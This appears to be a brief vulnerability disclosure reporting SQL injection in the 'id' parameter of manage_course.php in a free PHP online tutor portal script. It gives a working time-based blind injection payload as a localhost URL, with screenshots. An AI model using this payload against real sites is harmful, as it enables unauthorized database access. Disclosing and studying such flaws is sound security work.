## SQL injection vulnerability exists in online tutor portal system

## Vulnerability author:wanglun

supplier:
https://www.sourcecodester.com/php/15339/online-tutor-portal-site-phpopp-free-source-code.html

edition: 
1.0

/manage_course.php

The Id parameter has SQL injection. Procedure

Payload: https://localhost:443/otps/tutor/courses/manage_course.php?id=2' AND (SELECT 2701 FROM (SELECT(SLEEP(5)))jDRp) AND 'SYOZ'='SYOZ

![image](https://github.com/user-attachments/assets/7699edde-ec09-44fe-aea7-900e49d3b06c)

![image](https://github.com/user-attachments/assets/9410cd17-4c58-4b86-87f6-10568352b354)

